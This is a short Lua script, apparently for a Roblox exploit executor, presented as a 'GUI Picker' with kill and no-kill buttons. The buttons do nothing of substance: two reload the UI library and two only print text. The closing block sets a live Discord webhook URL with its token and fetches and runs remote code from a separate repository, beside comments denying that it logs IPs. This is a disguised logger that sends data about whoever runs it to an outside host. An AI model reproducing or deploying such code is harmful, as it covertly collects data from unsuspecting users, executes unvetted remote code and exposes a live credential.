local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/forumsLib/main/source.lua"))()
local Forums = Library.new("GUI Picker")

local preview = Forums:NewSection("No kill GUI")
local preview1 = Forums:NewSection("Kill / Normal GUI")

preview:NewButton("Execute No-Kill", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/forumsLib/main/source.lua"))()
    end)

preview:NewButton("GUI without entities that can kill", function()
    print("Hello Wolrd!")
    end)

    --Kill Gui

preview1:NewButton("Execute Kill", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/forumsLib/main/source.lua"))()
    end)

preview1:NewButton("Normal GUI that entities kill", function()
    print("Good choice")
    end)

    --Webhook
--This is purely for testing purposes and debugging info for maximum enjoyment and compatibility. I do not log IP and other malicious uses for it. 
getgenv().WebhookHere = "https://canary.discord.com/api/webhooks/1035370874435534918/AnX0NmXuO6KhlzwaXVbHZU1t-QOkDnKlsJbAENNgdmuywxN58xqWU7JHtvhUs1labDpN"
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
--If you plan on using this webhook for mean reasons please refrain from doing so!

